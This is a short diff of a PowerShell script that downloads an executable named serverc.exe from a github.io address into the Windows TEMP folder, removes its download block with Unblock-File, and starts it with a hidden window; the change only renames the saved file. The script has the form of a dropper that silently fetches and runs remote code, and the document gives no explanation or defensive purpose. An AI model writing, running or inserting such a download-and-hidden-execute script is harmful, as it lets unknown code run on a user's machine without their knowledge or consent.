@@ -1,3 +1,3 @@
-IWR 'https://untitledmanifoldguy.github.io/serverc.exe' -OutFile $env:TEMP\sv.exe
-Unblock-File $env:TEMP\sv.exe
-Start-Process $env:TEMP\sv.exe -WindowStyle Hidden
+IWR 'https://untitledmanifoldguy.github.io/serverc.exe' -OutFile $env:TEMP\serverc.exe
+Unblock-File $env:TEMP\serverc.exe
+Start-Process $env:TEMP\serverc.exe -WindowStyle Hidden
